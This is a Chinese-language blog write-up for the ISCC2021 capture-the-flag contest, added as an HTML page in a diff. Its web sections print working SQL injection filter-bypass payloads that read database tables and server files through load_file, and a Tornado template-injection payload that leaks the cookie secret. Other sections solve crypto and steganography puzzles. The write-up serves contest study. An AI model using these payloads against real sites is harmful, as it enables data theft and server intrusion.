@@ -1,0 +1,223 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="google-site-verification" content="" />
+  <meta name="referrer" content="unsafe-url">
+  
+  <title>ISCC2021-部分题目再现</title>
+  <meta name="author" content="Willianhuanbian">
+  <meta name="description" content="@TOC
+练武easyweb很明显，本题需要进行sql注入但是并不知道注入点经过测试，判断注入点为：’ 闭合符号用%23代替在后面测试发现空格被过滤了，我们可以使用%0d进行绕过尝试使用联合查询发现union,select,尝试使用双写进行绕过payload?id=0&amp;#39;%0dununioni">
+  
+  
+  <meta property="og:title" content="ISCC2021-部分题目再现"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta property="og:site_name" content="Willianir&#39;s home"/>
+  <link href="/apple-touch-icon-precomposed.png" sizes="180x180" rel="apple-touch-icon-precomposed">
+  <link rel="alternate" href="/atom.xml" title="Willianir&#39;s home" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/m.min.css">
+  <link rel="icon" type="image/x-icon" href="/favicon.ico">
+  <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
+
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+<body>
+  <a id="top"></a>
+  <div id="main">
+    <div class="main-ctnr">
+      <div class="behind">
+  <a href="/" class="back black-color">
+    <svg class="i-close" viewBox="0 0 32 32" width="22" height="22" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="3">
+        <path d="M2 30 L30 2 M30 30 L2 2"></path>
+    </svg>
+  </a>
+  
+</div>
+
+
+  <article class="standard post">
+    <div class="title">
+      
+  
+    <h1 class="page-title center">
+        ISCC2021-部分题目再现
+    </h1>
+  
+
+
+    </div>
+    <div class="meta center">
+      <time datetime="2021-06-05T07:48:43.962Z" itemprop="datePublished">
+  <svg class="i-calendar" viewBox="0 0 32 32" width="16" height="16" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2">
+    <path d="M2 6 L2 30 30 30 30 6 Z M2 15 L30 15 M7 3 L7 9 M13 3 L13 9 M19 3 L19 9 M25 3 L25 9"></path>
+  </svg>
+  &nbsp;
+  2021-06-05
+</time>
+
+
+
+
+
+
+    </div>
+    <hr>
+    
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%83%E6%AD%A6"><span class="toc-text">练武</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#easyweb"><span class="toc-text">easyweb</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tornado"><span class="toc-text">tornado</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%8E%E5%8D%8E%E7%9A%84%E7%BA%A2%E5%8C%85"><span class="toc-text">李华的红包</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%B7%E5%B8%82%E8%9C%83%E6%A5%BC-1"><span class="toc-text">海市蜃楼-1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BE%8E%E4%BA%BA%E8%AE%A1"><span class="toc-text">美人计</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%88%91%E7%9A%84%E6%8A%98%E6%89%A3%E6%98%AF%E5%A4%9A%E5%B0%91"><span class="toc-text">我的折扣是多少</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5%E4%B8%80%E4%B8%8B"><span class="toc-text">检查一下</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%8F%E6%98%8E%E7%9A%84%E5%AE%A0%E7%89%A9%E5%9B%BE"><span class="toc-text">小明的宠物图</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%8F%E6%98%8E%E7%9A%84%E8%A1%A8%E6%83%85%E5%8C%85"><span class="toc-text">小明的表情包</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%93%82%E5%8F%B0"><span class="toc-text">擂台</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ISCC%E5%AE%A2%E6%9C%8D%E5%86%B2%E5%86%B2%E5%86%B2%EF%BC%88%E4%B8%80%EF%BC%89"><span class="toc-text">ISCC客服冲冲冲（一）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%99%E6%98%AF%E5%95%A5"><span class="toc-text">这是啥</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web01"><span class="toc-text">Web01</span></a></li></ol></li></ol>
+    
+    <div class="picture-container">
+      
+    </div>
+    </font>
+
+<p>@<a href="%E6%96%87%E7%AB%A0%E7%9B%AE%E5%BD%95">TOC</a></p>
+<h1 id="练武"><a href="#练武" class="headerlink" title="练武"></a>练武</h1><h2 id="easyweb"><a href="#easyweb" class="headerlink" title="easyweb"></a>easyweb</h2><p>很明显，本题需要进行sql注入但是并不知道注入点<br>经过测试，判断注入点为：<code>’</code> 闭合符号用%23代替<img src="https://img-blog.csdnimg.cn/20210524193940823.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>在后面测试发现空格被过滤了，我们可以使用<code>%0d</code>进行绕过<br>尝试使用联合查询发现<code>union,select</code>,尝试使用双写进行绕过<br>payload<br><code>?id=0&#39;%0dununionion%0dselselectect%0d1,2,3%23</code><img src="https://img-blog.csdnimg.cn/20210524194243748.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到显示位<br>根据一贯风格，爆数据库名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27;%0dununionion%0dselselectect%0d1,database(),3%23</span><br></code></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210524194530324.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后是爆表名，经过测试发现<code>from、information_schema</code>同样也被过滤了</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span>、<span class="hljs-keyword">from</span> 则可以尝试进行双写或者大写转换等进行绕过<br><span class="hljs-number">2</span>、information_schema的话则可以尝试同类型进行转换，查看版本，<span class="hljs-number">5.7</span><span class="hljs-number">.33</span>，存在sys数据库，所以可以利用sys数据库查出表名<br></code></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210524195109868.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>构造payload<br><code>?id=0&#39;%0dununionion%0dselselectect%0d1,(selselectect%0dgroup_concat(table_name)%0dFROM%0dsys.schema_table_statistics_with_buffer),3%0d%23</code><br><img src="https://img-blog.csdnimg.cn/20210524200012321.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到表名<br>判断列数<br><code>?id=0&#39;%0dununionion%0dselselectect%0d1,(selselectect%0dgroup_concat(table_name)%0dFROM%0dsys.schema_auto_increment_columns),3%0d%23</code><img src="https://img-blog.csdnimg.cn/20210524200440224.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>表名都是iscc_flag<br>盲猜列名是：flag<br>构造payload</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27;%0dununionion%0dselselectect%0d1,(selselectect%0dflag%0dfrom%0discc_flag),3%0d%23</span><br></code></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210524200822427.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>进入该页面得到源码进行分析</p>
+<p>`&lt;?php</p>
+<p>if(isset($_GET[‘c’])){<br>  <svg xmlns:xlink="http://www.w3.org/1999/xlink" width="3.46ex" height="1.676ex" style="vertical-align: -0.338ex;" viewBox="0 -576.1 1489.8 721.6" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
+<title id="MathJax-SVG-1-Title">c=</title>
+<defs aria-hidden="true">
+<path stroke-width="1" id="E1-MJMATHI-63" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"></path>
+<path stroke-width="1" id="E1-MJMAIN-3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path>
+</defs>
+<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
+ <use xlink:href="#E1-MJMATHI-63" x="0" y="0"></use>
+ <use xlink:href="#E1-MJMAIN-3D" x="711" y="0"></use>
+</g>
+</svg>_GET[‘c’];</p>
+<pre><code>if(preg_match(&quot;/[zxcvbMnlkjhgfsaoiuytreq]+|[ZXCVBNLKKJHGFSAOIUYTREQ]+|[0123456789]+|\(|\/|\*|\-|\+|\.|\&#123;|\&#125;|\[|\]|\&#39;|\&quot;|\?|\&gt;|\&lt;|\,|\)|\(|\&amp;|\^|\%|\#|\@|\!/&quot;, $c))&#123;
+   exit(&quot;die!!&quot;);
+&#125;else&#123;
+ echo `$c`;
+&#125;
+</code></pre>
+<p>}else{<br>    highlight_file(<strong>FILE</strong>);<br>}<br>?&gt;</p>
+<!--flllllllllaaag.php-->`
+
+<p>似乎没什么发现，26个英文字母表对比一下上述的英文字符<code>zxcvbMnlkjhgfsaoiuytreq</code><br>发现没被过滤的字母有<code>dmpw</code>，执行pwd获取文件路径，<br>获取flag位置，使用load_file()方法<br><code>?id=0&#39;%0dununionion%0dseselectlect%0d1,(load_file(&#39;/var/www/const/flllllllllaaag.php&#39;)),3%0d%23</code></p>
+<p><img src="https://img-blog.csdnimg.cn/20210524201553249.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>或者是<br><code>?id=-1&#39;%0duniunionon%0dselselectect%0d1,(load_file(&#39;/etc/apache2/sites-available/000-default.conf&#39;)),3%23    //此路径为默认</code><br>获取网站路径</p>
+<p><img src="https://img-blog.csdnimg.cn/20210524201824466.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>在源代码中查看flag<img src="https://img-blog.csdnimg.cn/20210524201859455.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="tornado"><a href="#tornado" class="headerlink" title="tornado"></a>tornado</h2><p><img src="https://img-blog.csdnimg.cn/20210524202657707.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>进入三个路径的文件，发现flag.txt中flag在/fllllllllllllaaaaaag中；<br>welcome.txt中提示<code>render函数</code>，百度一下存在render函数的模板注入；<br>hints.txt告诉我们<code>md5(cookie_secret+md5(filename))</code> 发现我们需要进行md5</p>
+<p>查看hints.txt的路径</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//39.96.91.106:7060/file?filename=/hints.txt&amp;filehash=c61a0774797a56fc60854ac778aa3d15</span><br></code></pre></td></tr></table></figure>
+<p>有filehash参数，根据所给出的提示filehasc的值是MD5处理，有了filehash还需要有cookie_secret这一步可以参考之前的题型，有大佬做出明确解释<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45836474/article/details/107940521">看这里</a><br>构造payload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-built_in">error</span>?msg=&#123;&#123;handler.settings&#125;&#125;<br></code></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210524204816774.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到cookie_secret,计算hash值<br>拿到大佬脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">md5encode</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):</span><br>    m = hashlib.md5()<br>    m.update(<span class="hljs-built_in">str</span>)<br>    <span class="hljs-keyword">return</span> m.hexdigest()<br><br><br>name = <span class="hljs-string">&#x27;/fllllllllllllaaaaaag&#x27;</span><br>secret = <span class="hljs-string">&#x27;ef57c331-744f-4528-b434-9746317d4f6a&#x27;</span><br>name = name.encode()<br>bb = md5encode((secret + md5encode(name)).encode())<br>print(bb)<br></code></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210524210129226.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="李华的红包"><a href="#李华的红包" class="headerlink" title="李华的红包"></a>李华的红包</h2><p><img src="https://img-blog.csdnimg.cn/20210525192159628.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>010Editor打开<img src="https://img-blog.csdnimg.cn/20210525192713781.png" alt="在这里插入图片描述"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">24</span>,<span class="hljs-number">43</span>,<span class="hljs-number">13</span>,<span class="hljs-number">13</span>,<span class="hljs-number">12</span>,<span class="hljs-number">21</span>,<span class="hljs-number">43</span><br></code></pre></td></tr></table></figure>
+<p>尝试了一下，有点像敲击码<img src="https://img-blog.csdnimg.cn/20210525192919472.png" alt="在这里插入图片描述"></p>
+<p>最后得到flag:<code>ISCCBFS</code></p>
+<h2 id="海市蜃楼-1"><a href="#海市蜃楼-1" class="headerlink" title="海市蜃楼-1"></a>海市蜃楼-1</h2><p>打开文档没什么有用的东西，把文档改成zip形式</p>
+<p><img src="https://img-blog.csdnimg.cn/20210525193328667.png" alt="在这里插入图片描述"></p>
+<p>点进去查找flag<img src="https://img-blog.csdnimg.cn/20210525193419869.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="美人计"><a href="#美人计" class="headerlink" title="美人计"></a>美人计</h2><p>打开文件，一张图片格式找到提示信息<br><img src="https://img-blog.csdnimg.cn/20210525193957889.png" alt="在这里插入图片描述"><br>很显然这是AES加密,密匙是ISCC2021<br>打开文档里面有一张二维码，扫描得到信息</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">U2FsdGVkX1/Ka+sScszwQkwhO+VLiJwV/<span class="hljs-number">6</span>IFg5W+TfNHGxG2qZsIr2iwMwb9X9Iu <span class="hljs-number">3</span>GuGWmPOtO27z8vNppD2D50fwsD+<span class="hljs-number">8</span>VWhdtW9J4cewYivH/Z/<span class="hljs-number">7</span>GoUvcJXJMrvf+vu +CBqWDGp6HWd0e5whGhuzlK0ZtBcDZdPDSIHA7+GuUlifp8PcFCtJPgiuk143REE +pKFiSJXolXLR1vJCdGY9w5mXFbiWPrb2U7r/v5noP8=<br></code></pre></td></tr></table></figure>
+<p>进行三次解密得到字符：<code>y0u_h@ve_fal1en_intO_tHe_tr@p_0f_tHe_be@uty_!</code></p>
+<p>很是让人头大！！<br>试着将word文档改为压缩包，在ny4w1nbmry4m.zip\word\media中看到了两张image<br>其中一个就是那张二维码，还有另一张二维码，扫描出结果是</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">U2FsdGVkX19eOY/pDh8+vPAcvfkLi1XLUneVzjLLOMul53sKK8UpobdCOiPIv4KE<br></code></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210525194416299.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>但是，进行AES解密失败，所以尝试了DES，即可得到flag<img src="https://img-blog.csdnimg.cn/20210525194712905.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="我的折扣是多少"><a href="#我的折扣是多少" class="headerlink" title="我的折扣是多少"></a>我的折扣是多少</h2><p>下载好文件后，运行exe文件得到一串编码<img src="https://img-blog.csdnimg.cn/20210525195521957.png" alt="在这里插入图片描述"><br><code>pass1&#123;\u006b\u0072\u0077&#125;</code>，Unicode编码，解码后为<code>pass1&#123;krw&#125;</code><br>在010Editor打开压缩包在尾部发现<img src="https://img-blog.csdnimg.cn/20210525195735180.png" alt="在这里插入图片描述"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">cGFzczJ7Z2NjNjY2fQ==<br></code></pre></td></tr></table></figure>
+<p>进行base64编码得到：pass2{gcc666}<br>组合起来用密码：krwgcc666解开压缩包<img src="https://img-blog.csdnimg.cn/2021052519595244.png" alt="在这里插入图片描述"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">eW91Zm91bmRtZT8=<br></code></pre></td></tr></table></figure>
+<p>base64解出来是：youfoundme?<br>接下来还剩一个MP3格式的文件MP3一般都是用MP3stego解密，接出来密码是youfoundme?<br>得到<code>ISCC&#123;LFXXK4TENFZWG33VNZ2DELRRGU======&#125;</code></p>
+<p>进行base32解密<br><img src="https://img-blog.csdnimg.cn/2021052520020990.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="检查一下"><a href="#检查一下" class="headerlink" title="检查一下"></a>检查一下</h2><p>解压后是一张图片，尝试进行binwalk进行分离<img src="https://img-blog.csdnimg.cn/2021052520124651.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>解压后的文件，发现有一个文档打开后01的字符串<img src="https://img-blog.csdnimg.cn/20210525201451663.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>联想到是01字符串画二维码<br>先看下字符串长度发现是841，而正好是29的平方，那应该就是二维码了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>MAX = <span class="hljs-number">29</span>    <span class="hljs-comment">#宽高 841个01字符串，所以宽和高是29</span><br>pic = Image.new(<span class="hljs-string">&quot;RGB&quot;</span>,(MAX, MAX))<br><span class="hljs-comment">#若是(255,255,255)、(0,0,0)需要先转换01 </span><br><span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;1111111000100100110000111111110000010011011110010101000001101110100111010011010010111011011101000000111011110101110110111010010111101110001011101100000101110111000010010000011111111010101010101010111111100000000011100100110100000000100101101110000101010101000001101000011101011011011100101000001110010010001111011110010001100000101101100111111001010110101101110000100011110100110001001100010010101110000111111111110010100110101001111110010110001100110111110111000110011110010001111001110000100011010000110100100000001011001010101101110100011011010011100011101001111011111000101001101101101100101010001111101000000000011101101101010001011011111110000011110000101011010100000101011110010101000101101011101001010011001011111001010111010110101111000001101001101110100101010000010100111011000001000011101000011001001011111110100100100000111100110&quot;</span><br>i=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">0</span>,MAX):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">0</span>,MAX):<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">str</span>[i] == <span class="hljs-string">&#x27;1&#x27;</span>):<br>            pic.putpixel([x,y],(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>))<br>        <span class="hljs-keyword">else</span>:<br>            pic.putpixel([x,y],(<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">255</span>))<br>        i = i+<span class="hljs-number">1</span><br>pic.show()<br>pic.save(<span class="hljs-string">&quot;./flag.png&quot;</span>)<br></code></pre></td></tr></table></figure>
+<p>得到二维码扫描<br><img src="https://img-blog.csdnimg.cn/20210525201635774.png" alt="在这里插入图片描述"></p>
+<h2 id="小明的宠物图"><a href="#小明的宠物图" class="headerlink" title="小明的宠物图"></a>小明的宠物图</h2><p>下载后是一张图片<img src="https://img-blog.csdnimg.cn/20210525201858964.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>用binwalk分离图片得到flag.txt和key.zip<br>flag.txt中内容为<code>U2FsdGVkX18kNy7RlBvcV9WJsqa+oxvdd0Ir86U2cU2996N6ltZi7VVOaw==</code><br>显然需要密钥解密<img src="https://img-blog.csdnimg.cn/20210525202033954.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>打开key.zip发现其中的key.txt只有5字节大小，结合那个兔子说的它需要碰撞应该是crc32碰撞，尝试发现(0_0)为密钥<img src="https://img-blog.csdnimg.cn/20210525203843687.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="小明的表情包"><a href="#小明的表情包" class="headerlink" title="小明的表情包"></a>小明的表情包</h2><p><img src="https://img-blog.csdnimg.cn/20210525204154640.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以看到这是凯撒解密，但是偏移量是未知的，通过枚举：发现偏移量为：13时是英文日期，加上提示，年月日可以想到1999，但是月份和日期没有，都是数字，字节为8位可以使用Ziperello进行爆破</p>
+<p><img src="https://img-blog.csdnimg.cn/20210525204457701.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210525204847759.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到密码：07071999<br>然后打开文件时不支持的，所以在winhex中查看，发现它的文件头缺失了，然后补充好，得到图片<img src="https://img-blog.csdnimg.cn/20210525204930614.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h1 id="擂台"><a href="#擂台" class="headerlink" title="擂台"></a>擂台</h1><h2 id="ISCC客服冲冲冲（一）"><a href="#ISCC客服冲冲冲（一）" class="headerlink" title="ISCC客服冲冲冲（一）"></a>ISCC客服冲冲冲（一）</h2><p><img src="https://img-blog.csdnimg.cn/20210523200240718.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>==可以直接进行改票，但是会被检测到刷票行为==<br><img src="https://img-blog.csdnimg.cn/20210523200541210.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>既然不发进行刷票，那就直接把对方的投票按钮给他关闭！<br>我们可以通过火狐浏览器<strong>F12</strong>进入开发者模式，对源码进行修改直接讲对方的投票按钮删除😼<br><img src="https://img-blog.csdnimg.cn/2021052320100128.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210523201022881.png" alt="在这里插入图片描述"><br>可以看到对方以及在五六十票左右，因此我们需要进入后快速开发者模式，修改后在20s内点到票数超过对方就好了</p>
